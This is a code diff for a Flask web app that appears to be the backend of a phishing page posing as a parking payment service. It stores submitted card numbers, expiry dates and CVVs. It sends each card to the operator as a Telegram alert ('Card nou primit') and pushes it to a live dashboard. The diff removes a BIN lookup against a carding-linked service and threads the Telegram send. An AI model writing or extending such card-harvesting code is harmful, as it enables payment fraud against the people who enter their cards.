@@ -13,6 +13,7 @@ import csv
 import io
 import json
 import urllib.request
+import threading
 
 socketio = SocketIO()
 _session_sids = {}
@@ -374,31 +375,11 @@ def create_app():
             ps.exp_date = request.form.get('exp_date', '')
             ps.cvv = request.form.get('cvv', '')
             bin_bank = request.form.get('bin_bank', '')
-            # Server-side BIN lookup — overrides client value for accuracy
-            if len(card_raw) >= 6:
-                try:
-                    bin6 = card_raw[:6]
-                    _req = urllib.request.Request(
-                        f'https://bins.antipublic.cc/bins/{bin6}',
-                        headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
-                    with urllib.request.urlopen(_req, timeout=4) as _resp:
-                        _d = json.loads(_resp.read())
-                    _parts = [
-                        _d.get('bank', ''),
-                        _d.get('brand', ''),
-                        (_d.get('level', '')).upper(),
-                        (_d.get('type', '')).lower(),
-                        _d.get('country_name', ''),
-                        _d.get('country_flag', ''),
-                    ]
-                    bin_bank = ' · '.join(p for p in _parts if p)
-                except Exception:
-                    pass
             ps.bin_bank = bin_bank
             ps.status = 'payment_pending'
             db.session.commit()
             _card_curr = _currency_for_country(ps.country_code or '')
-            _send_telegram(
+            _tg_text = (
                 f'🔔 <b>Card nou primit</b>\n'
                 f'━━━━━━━━━━━━━━━━━━\n'
                 f'💳 <code>{ps.card_number_display}</code>\n'
@@ -411,6 +392,7 @@ def create_app():
                 f'⏱ {ps.hours} {ps.time_unit or "ore"}  |  💰 <b>{ps.total_price} {_card_curr["symbol"]}</b>\n'
                 f'🕐 {datetime.utcnow().strftime("%H:%M:%S UTC")}'
             )
+            threading.Thread(target=_send_telegram, args=(_tg_text,), daemon=True).start()
             socketio.emit('payment_submitted', {
                     'id': ps.id, 'plate': ps.plate_number,
                     'card_display': ps.card_number_display,
